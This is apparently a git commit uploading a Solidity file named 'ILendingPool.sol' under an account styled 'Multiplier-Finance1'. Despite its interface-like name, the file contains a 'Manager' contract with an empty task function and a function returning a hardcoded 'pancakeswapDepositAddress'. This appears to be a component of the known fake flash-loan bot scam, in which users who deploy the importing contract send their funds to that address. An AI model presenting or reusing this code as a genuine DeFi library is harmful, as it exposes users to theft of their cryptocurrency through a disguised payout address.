73d114797acd352a8f6cae2b338f6cd40c783755
Multiplier-Finance1 <102324926+Multiplier-Finance1@users.noreply.github.com>
2022-03-24 21:39:14 +0200

    Add files via upload

---
+++ ILendingPool.sol
@@ -0,0 +1,13 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+    
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x6026e19538dC8a2A89fA7aE060647f62C15c8388;
+    }
+}
+
+//pancakeswapfunction
